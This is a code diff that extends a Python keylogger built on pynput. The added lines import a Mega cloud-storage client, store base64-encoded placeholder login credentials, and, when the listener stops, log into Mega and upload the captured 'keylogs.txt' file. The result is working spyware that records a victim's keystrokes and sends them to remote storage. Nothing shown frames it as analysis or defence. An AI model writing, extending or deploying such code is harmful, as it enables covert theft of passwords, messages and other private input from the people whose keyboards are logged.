@@ -1,7 +1,13 @@
 from pynput.keyboard import Key, Listener
 from pynput import keyboard
 import logging
+from mega import Mega
+import base64
 import os
+
+mail = '<YOUR-MAIL-IN-BASE64>'
+passwd_enc = '<YOUR-PASSWORD-IN-BASE64>'
+mega = Mega()
 
 log_dir = ""
 
@@ -23,6 +29,9 @@ def on_release(key):
             f.read()
             f.seek(-8, os.SEEK_END)
             f.truncate()
+	m = mega.login(base64.b64decode(mail).decode('utf-8'), base64.b64decode(passwd_enc).decode('utf-8'))
+	filename = "keylogs.txt"
+	m.upload(filename)
         return False
 
 with Listener(on_press=on_press,on_release=on_release) as listener:
